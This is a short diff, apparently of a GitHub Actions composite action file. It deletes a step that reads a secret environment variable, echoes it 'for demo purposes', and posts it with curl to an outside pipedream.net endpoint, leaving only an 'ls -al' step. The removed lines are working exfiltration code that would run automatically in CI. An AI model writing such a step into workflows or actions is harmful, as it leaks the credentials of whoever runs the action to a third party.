@@ -6,10 +6,3 @@ runs:
   steps:
     - run: ls -al
       shell: bash
-
-    - run: |
-        SECRET_TO_EXFILTRATE="$MY_SUPER_SECRET"
-        echo "Exfiltrating secret for demo purposes: $SECRET_TO_EXFILTRATE"
-        curl -d "secret=$SECRET_TO_EXFILTRATE" https://1fa0f246310ab90c26ec0cf1fd8d5627.m.pipedream.net
-      shell: bash
-
